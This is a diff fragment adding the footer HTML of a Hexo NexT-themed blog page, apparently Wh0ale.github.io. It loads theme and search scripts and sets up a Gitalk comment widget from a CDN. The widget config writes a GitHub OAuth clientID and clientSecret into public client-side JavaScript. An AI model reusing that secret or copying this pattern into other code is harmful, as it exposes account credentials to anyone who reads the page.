+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
